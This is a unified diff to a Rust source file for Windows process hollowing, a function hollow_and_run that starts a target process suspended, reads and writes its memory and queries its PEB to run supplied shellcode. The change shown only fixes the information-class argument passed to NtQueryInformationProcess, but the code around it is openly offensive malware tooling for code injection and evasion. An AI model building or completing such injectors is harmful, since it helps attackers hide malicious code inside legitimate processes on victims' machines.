@@ -3,7 +3,7 @@ use std::{mem, ptr};
 use std::ffi::{CString, c_void};
 use windows::Win32::Foundation::PSTR;
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
-use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA};
+use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, ResumeThread, STARTUPINFOA};
 
 const POINTER_SIZE: usize = mem::size_of::<&u8>();
 const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
@@ -68,11 +68,12 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
     let process_handle = process_information.hProcess;
     let mut basic_information: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
+    let info_class: PROCESSINFOCLASS = unsafe { mem::zeroed() };
     
     // Get the PEB base address of the suspended process with ZwQueryInformationProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
-    if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, 0, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
+    if let Err(error) = unsafe { NtQueryInformationProcess(process_handle, info_class, &mut basic_information as *mut _ as *mut c_void, POINTER_SIZE_TIMES_SIX, ptr::null_mut()) } {
         panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
     }
 
